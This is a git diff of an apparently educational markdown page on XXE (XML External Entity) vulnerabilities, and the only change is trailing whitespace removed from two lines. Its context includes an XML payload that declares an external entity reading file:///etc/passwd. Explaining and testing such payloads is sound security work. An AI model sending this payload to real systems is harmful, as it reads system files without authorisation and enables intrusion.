@@ -14,7 +14,7 @@ toc: true
 
 ## Introduction
 
-An **XXE (XML External Entity)** vulnerability arises when a server-side XML parser processes external entities.  
+An **XXE (XML External Entity)** vulnerability arises when a server-side XML parser processes external entities.
 Attackers can read local files or cause SSRF requests from the target server.
 
 ## Detection Payload
@@ -51,7 +51,7 @@ Attackers can read local files or cause SSRF requests from the target server.
 
 ``` xml
 <?xml version="1.0" encoding="ISO-8859-1"?>
-  <!DOCTYPE foo [  
+  <!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
